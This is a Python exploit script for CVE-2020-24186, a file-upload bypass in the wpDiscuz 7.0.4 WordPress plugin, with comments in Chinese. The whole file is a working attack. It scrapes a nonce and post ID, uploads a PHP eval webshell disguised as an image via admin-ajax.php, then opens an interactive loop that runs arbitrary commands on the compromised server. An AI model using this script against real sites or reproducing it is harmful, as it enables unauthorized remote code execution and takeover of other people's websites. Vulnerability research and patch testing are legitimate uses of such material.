# Exploit Title: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution
# Tested on: Windows / WordPress 5.4.1 / wpDiscuz 7.0.4
# CVE : CVE-2020-24186
# /bin/python3

import requests
import optparse
import re
import random
import time
import string
import json

parser = optparse.OptionParser()
parser.add_option('-u', '--url', action="store", dest="url", help="Base target host: http://127.0.0.1/wordpress")
parser.add_option('-p', '--path', action="store", dest="path", help="Path to exploitation: /2022/04/04/hello-world")

options, args = parser.parse_args()

# print(options)
# print(args)

if not options.url or not options.path:
    print('[+] Specify an url and a path')
    print('[+] Example usage: exploit.py -u http://127.0.0.1 -p /wordpress/2021/06/blogpost')
    print('[+] Example help usage: exploit.py -h')
    exit()

session = requests.Session()

# 截取目标站点
original_url = options.url
path = options.path
final_url = options.url + options.path
clean_host = original_url.replace('http://', '').replace('/wordpress', '')


def banner():
    print('---------------------------------------------------------------')
    print('[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution')
    print('[-] File Upload Bypass Vulnerability - PHP Webshell Upload')
    print('[-] CVE: CVE-2020-24186')
    print('--------------------------------------------------------------- \n')


# 请求获取上传文件需要的wmuSecurity和wc_post_id
def urlrequest():
    global wmuSecurity
    global wc_post_id

    try:
        get_html = session.get(final_url)
        res_len = str(len(get_html.text))
        res_status = str(get_html.status_code)
        print('[+] Response length:[' + res_len + '] | status:[' + res_status + ']')

        raw_wmuSecurity = get_html.text.replace(',', '\n')
        wmuSecurity = re.findall('wmuSecurity.*$', raw_wmuSecurity, re.MULTILINE)[0].split('"')[2]
        print('[!] Got wmuSecurity value: ' + wmuSecurity + '')
        raw_postID = get_html.text.replace(',', '\n')
        wc_post_id = re.findall('wc_post_id.*$', raw_postID, re.MULTILINE)[0].split('"')[2]
        print('[!] Got wc_post_id value: ' + wc_post_id + ' \n')
        # print(raw_wmuSecurity)


    except requests.exceptions.HTTPError:
        print('\n[x] Failed to Connect in: ' + final_url + ' ')
        print('[x] This host seems to be Down')
        exit()

# 上传webshell
def shell_upload():
    global final_shellpath
    print('[!] Trying to Upload Webshell......')
    try:
        upload_url = original_url + "/wordpress/wp-admin/admin-ajax.php"
        # print(upload_url)
        upload_cookies = {"wordpress_test_cookie": "WP%20Cookie%20check"}
        upload_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
            "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "multipart/form-data; boundary=---------------------------281996218820895391722792289696",
            "Origin": original_url, "Connection": "close", "Referer": final_url}
        upload_data = "-----------------------------281996218820895391722792289696\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nwmuUploadFiles\r\n-----------------------------281996218820895391722792289696\r\nContent-Disposition: form-data; name=\"wmu_nonce\"\r\n\r\n" + wmuSecurity + "\r\n-----------------------------281996218820895391722792289696\r\nContent-Disposition: form-data; name=\"wmuAttachmentsData\"\r\n\r\n\r\n-----------------------------281996218820895391722792289696\r\nContent-Disposition: form-data; name=\"wmu_files[0]\"; filename=\"" + "1.php\"\r\nContent-Type: image/png\r\n\r\nGIF689a;\r\n\r\n<?php eval($_REQUEST['hack']); ?>\r\n\x1a\x82\r\n-----------------------------281996218820895391722792289696\r\nContent-Disposition: form-data; name=\"postId\"\r\n\r\n" + wc_post_id + "\r\n-----------------------------281996218820895391722792289696--\r\n"
        uploadfile = session.post(upload_url, headers=upload_headers, cookies=upload_cookies, data=upload_data)
        # print(uploadfile.text)
        json_object = json.loads(uploadfile.text)
        status = json_object["success"]

        raw_upload = (uploadfile.text.replace(',', '\n'))
        get_urlafter = re.findall('url.*$', raw_upload, re.MULTILINE)
        find_urlafter = str(get_urlafter)
        shell_url = (find_urlafter.replace('\\', '').replace('url&quot;:&quot;', '').replace('\',', '').replace('&quot;','').replace('[\'', ''))
        final_shellpath = (shell_url.split(" ", 1)[0])

        if status == True:
            print('[+] Upload Success... Webshell path:' + final_shellpath + ' \n')
        else:
            print('[x] Failed to Upload Webshell in: ' + upload_url + ' ')
            exit()


    except requests.exceptions.HTTPError:
        print('[x] Failed to Upload Webshell in: ' + upload_url + ' ')

    # return shell

# 远程命令执行
def shell_exec():
    try:
        while True:
            hack = input('> ')
            hackshell = session.get(final_shellpath + '?hack=' + hack + '')
            print(hackshell.text.replace('GIF689a;', '').replace('�', ''))
    except:
        print('\n[x] Failed to execute PHP code...')


banner()
urlrequest()
shell_upload()
shell_exec()
